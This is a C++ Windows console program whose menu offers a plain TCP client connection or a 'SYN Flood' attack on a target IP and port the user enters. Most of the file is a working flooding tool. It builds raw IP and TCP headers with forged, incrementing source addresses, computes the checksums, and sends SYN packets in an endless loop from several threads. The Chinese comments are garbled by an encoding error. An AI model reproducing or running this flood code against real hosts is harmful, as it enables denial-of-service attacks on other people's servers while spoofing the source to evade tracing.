// client.cpp : �������̨Ӧ�ó������ڵ㡣
//

#include "stdafx.h"
#include <winsock2.h>
#pragma comment (lib,"ws2_32")
#include <Ws2tcpip.h>
#include <conio.h>
#include <iostream>

using namespace std;

#define SEQ 0x28376839               //�������


int threadnum, maxthread;             //�߳̿���
int port;                            //Ŀ��˿�
char DestIP[32];                        //Ŀ��IP


									 // ����״̬��ʾ����
void display(void)
{
	static int play = 0;


	// ������
	char *plays[12] =
	{
		" | ",
		" / ",
		" - ",
		" \\ ",
		" | ",
		" / ",
		" - ",
		" \\ ",
		" | ",
		" / ",
		" - ",
		" \\ ",
	};
	printf("=%s= %d threads \r", plays[play], threadnum);
	play = (play == 11) ? 0 : play + 1;
}


//����һ��tcphdr�ṹ�����TCP�ײ�(9����Ա,20�ֽ�)
typedef struct tcphdr
{
	USHORT th_sport;                    //16λԴ�˿ں�
	USHORT th_dport;                    //16λĿ�Ķ˿ں�
	unsigned int th_seq;                //32λ���к�
	unsigned int th_ack;                //32λȷ�Ϻ�
	unsigned char th_lenres;            //4λ�ײ�����+6λ�������е�4λ
	unsigned char th_flag;              //6λ��־λ
	USHORT th_win;                      //16λ���ڴ�С
	USHORT th_sum;                      //16λЧ���
	USHORT th_urp;                      //16λ��������ƫ����
}TCP_HEADER;


//����һ��iphdr�����IP�ײ�(10����Ա,20�ֽ�)
typedef struct iphdr
{
	unsigned char h_verlen;              //4λ�ײ����ȣ���4λIP�汾��
	unsigned char tos;                   //8λ���ͷ���
	unsigned short total_len;            //16λ�ܳ���
	unsigned short ident;                //16λ��־
	unsigned short frag_and_flags;       //3λ��־λ����SYN,ACK,�ȵ�)
	unsigned char ttl;                   //8λ����ʱ��TTL
	unsigned char proto;                 //8λЭ��(TCP,UDP)
	unsigned short checksum;             //16λip�ײ�Ч���
	unsigned int sourceIP;               //32λα��IP��ַ
	unsigned int destIP;                 //32λ������ip��ַ
}IP_HEADER;


//TCPα�ײ������ڽ���TCPЧ��͵ļ��㣬��֤TCPЧ�����Ч��(5����Ա,12�ֽ�)
struct
{
	unsigned long saddr;//Դ��ַ
	unsigned long daddr;                //Ŀ�ĵ�ַ
	char mbz;                           //�ÿ�
	char ptcl;                          //Э������
	unsigned short tcpl;                //TCP����
}PSD_HEADER;


//����Ч��ͺ������Ȱ�IP�ײ���Ч����ֶ���Ϊ0(IP_HEADER.checksum=0)
//Ȼ���������IP�ײ��Ķ����Ʒ���ĺ͡�
USHORT checksum(USHORT *buffer, int size)
{
	unsigned long cksum = 0;
	while (size >1)
	{
		cksum += *buffer++;
		size -= sizeof(USHORT);
	}
	if (size) cksum += *(UCHAR*)buffer;
	cksum = (cksum >> 16) + (cksum & 0xffff);
	cksum += (cksum >> 16);
	return (USHORT)(~cksum);
}


//synflood�̺߳���
DWORD WINAPI SynfloodThread(LPVOID lp)
{
	SOCKET  sock = NULL;
	int ErrorCode = 0, flag = true, TimeOut = 2000, FakeIpNet, FakeIpHost, dataSize = 0, SendSEQ = 0;
	struct        sockaddr_in sockAddr;
	TCP_HEADER  tcpheader;
	IP_HEADER   ipheader;
	char        sendBuf[128];


	//�����׽���
	sock = WSASocket(AF_INET, SOCK_RAW, IPPROTO_RAW, NULL, 0, WSA_FLAG_OVERLAPPED);
	if (sock == INVALID_SOCKET)
	{
		printf("Socket failed: %d\n", WSAGetLastError());
		return 0;
	}


	//����IP_HDRINCL�Ա��Լ����IP�ײ�
	ErrorCode = setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char *)&flag, sizeof(int));
	if (ErrorCode == SOCKET_ERROR)
	{
		printf("Set sockopt failed: %d\n", WSAGetLastError());
		return 0;
	}


	//���÷��ͳ�ʱ
	ErrorCode = setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&TimeOut, sizeof(TimeOut));
	if (ErrorCode == SOCKET_ERROR)
	{
		printf("Set sockopt time out failed: %d\n", WSAGetLastError());
		return 0;
	}


	//����Ŀ���ַ
	memset(&sockAddr, 0, sizeof(sockAddr));
	sockAddr.sin_family = AF_INET;
	sockAddr.sin_addr.s_addr = inet_addr(DestIP);
	sockAddr.sin_port = htons(port);
	FakeIpNet = inet_addr("10.168.150.1");
	FakeIpHost = ntohl(FakeIpNet);


	//���IP�ײ�
	ipheader.h_verlen = (4 << 4 | sizeof(IP_HEADER) / sizeof(unsigned long));
	ipheader.total_len = htons(sizeof(IP_HEADER) + sizeof(TCP_HEADER));
	ipheader.ident = 1;
	ipheader.frag_and_flags = 0;
	ipheader.ttl = 128;
	ipheader.proto = IPPROTO_TCP;
	ipheader.checksum = 0;
	ipheader.sourceIP = htonl(FakeIpHost + SendSEQ);
	ipheader.destIP = inet_addr(DestIP);


	//���TCP�ײ�
	tcpheader.th_sport = htons(7000);
	tcpheader.th_dport = htons(port);	
	tcpheader.th_seq = htonl(SEQ + SendSEQ);
	tcpheader.th_ack = 0;
	tcpheader.th_lenres = (sizeof(TCP_HEADER) / 4 << 4 | 0);
	tcpheader.th_flag = 2;
	tcpheader.th_win = htons(16384);
	tcpheader.th_urp = 0;
	tcpheader.th_sum = 0;


	//���TCPα�ײ�
	PSD_HEADER.saddr = ipheader.sourceIP;
	PSD_HEADER.daddr = ipheader.destIP;
	PSD_HEADER.mbz = 0;
	PSD_HEADER.ptcl = IPPROTO_TCP;
	PSD_HEADER.tcpl = htons(sizeof(tcpheader));


	for (;;)
	{
		SendSEQ = (SendSEQ == 65536) ? 1 : SendSEQ + 1;
		//ipͷ
		ipheader.checksum = 0;
		ipheader.sourceIP = htonl(FakeIpHost + SendSEQ);
		//tcpͷ
		tcpheader.th_seq = htonl(SEQ + SendSEQ);
		//tcpheader.th_sport = htons(SendSEQ);
		tcpheader.th_sum = 0;
		//TCPα�ײ�
		PSD_HEADER.saddr = ipheader.sourceIP;


		//��TCPα�ײ���TCP�ײ����Ƶ�ͬһ������������TCPЧ���
		memcpy(sendBuf, &PSD_HEADER, sizeof(PSD_HEADER));
		memcpy(sendBuf + sizeof(PSD_HEADER), &tcpheader, sizeof(tcpheader));
		tcpheader.th_sum = checksum((USHORT *)sendBuf, sizeof(PSD_HEADER) + sizeof(tcpheader));
		memcpy(sendBuf, &ipheader, sizeof(ipheader));
		memcpy(sendBuf + sizeof(ipheader), &tcpheader, sizeof(tcpheader));
		memset(sendBuf + sizeof(ipheader) + sizeof(tcpheader), 0, 4);
		dataSize = sizeof(ipheader) + sizeof(tcpheader);
		ipheader.checksum = checksum((USHORT *)sendBuf, dataSize);
		memcpy(sendBuf, &ipheader, sizeof(ipheader));
		int retSend = sendto(sock, sendBuf, dataSize, 0, (struct sockaddr*) &sockAddr, sizeof(sockAddr));
		if (retSend == SOCKET_ERROR)
		{
			int e = WSAGetLastError();
			printf("sendto failed: %d\n", WSAGetLastError());
			return 0;
		}
		
		display();
		//Sleep(2000);
	}




	InterlockedExchangeAdd((long *)&threadnum, -1);
	return 0;
}

void synFlood(int maxthread=8)
{
	int ErrorCode = 0;
	

	//����߳�������100����߳�������Ϊ100
	//maxthread = (maxthread>100) ? 100 : atoi(argv[3]);


	WSADATA wsaData;
	if ((ErrorCode = WSAStartup(MAKEWORD(2, 2), &wsaData)) != 0)
	{
		printf("WSAStartup failed: %d\n", ErrorCode);
		return ;
	}


	printf("[start]...........\nPress any key to stop!\n");


	//ѭ�������߳�
	while (threadnum < maxthread)
	{
		if (CreateThread(NULL, 0, SynfloodThread, 0, 0, 0))
		{
			Sleep(10);
			threadnum++;
		}
	}

	Sleep(1000 * 500);
	WSACleanup();
	printf("\n[Stopd]...........\n");
}

void initialization() {
	//��ʼ���׽��ֿ�
	WORD w_req = MAKEWORD(2, 2);//�汾��
	WSADATA wsadata;
	int err;
	err = WSAStartup(w_req, &wsadata);
	if (err != 0) {
		cout << "��ʼ���׽��ֿ�ʧ�ܣ�" << endl;
	}
	else {
		cout << "��ʼ���׽��ֿ�ɹ���" << endl;
	}
	//���汾��
	if (LOBYTE(wsadata.wVersion) != 2 || HIBYTE(wsadata.wHighVersion) != 2) {
		cout << "�׽��ֿ�汾�Ų�����" << endl;
		WSACleanup();
	}
	else {
		cout << "�׽��ֿ�汾��ȷ��" << endl;
	}
	//������˵�ַ��Ϣ
}
int normalConnect() {
	//���峤�ȱ���
	int send_len = 0;
	int recv_len = 0;
	//���巢�ͻ������ͽ��ܻ�����
	char send_buf[1024];
	char recv_buf[1024];
	//���������׽��֣����������׽���
	SOCKET s_server;
	//����˵�ַ�ͻ��˵�ַ
	SOCKADDR_IN server_addr;
	initialization();
	//���������Ϣ
	server_addr.sin_family = AF_INET;
	server_addr.sin_addr.S_un.S_addr = inet_addr(DestIP);
	server_addr.sin_port = htons(port);
	//�����׽���
	s_server = socket(AF_INET, SOCK_STREAM, 0);
	if (connect(s_server, (SOCKADDR *)&server_addr, sizeof(SOCKADDR)) == SOCKET_ERROR) {
		cout << "����������ʧ�ܣ�" << WSAGetLastError();
		WSACleanup();
		return 0;
	}
	else {
		cout << "���������ӳɹ���" << endl;
	}

	//����,��������
	while (1) {
		cout << "�����뷢����Ϣ:";
		cin.getline(send_buf, sizeof(send_buf));
		send_len = send(s_server, send_buf, 100, 0);
		if (send_len < 0) {
			cout << "����ʧ�ܣ�" << GetLastError() << endl;
			break;
		}
		recv_len = recv(s_server, recv_buf, 100, 0);
		if (recv_len < 0) {
			cout << "����ʧ�ܣ�" << GetLastError() << endl;
			break;
		}
		else {
			recv_buf[recv_len] = 0;
			cout << "�������Ϣ:" << recv_buf << endl;
		}

	}
	//�ر��׽���
	closesocket(s_server);
	//�ͷ�DLL��Դ
	WSACleanup();
	return 0;
}


//ʹ�ð���
void usage()
{
	printf("\t===================SYN Flood======================\n");
	printf("\t1.��ͨ����\n");
	printf("\t2.ִ��syn����\n");
}
int main(int argc, char* argv[])
{
	char input_buf[128] = { 0 };
	
	cout << "���������IP��";
	cin >> input_buf;
	strcpy_s(DestIP, sizeof(DestIP), input_buf);

	cout << "����˿ڣ�";
	cin >> input_buf;
	port = atoi(input_buf);

	

	usage();
	cin >> input_buf;

	switch (input_buf[0])
	{
	case '1':
	{
		normalConnect();
	}break;

	case '2':
	default:
	{
		synFlood();
	}break;
	}


	
	_getch();

	return 0;
}

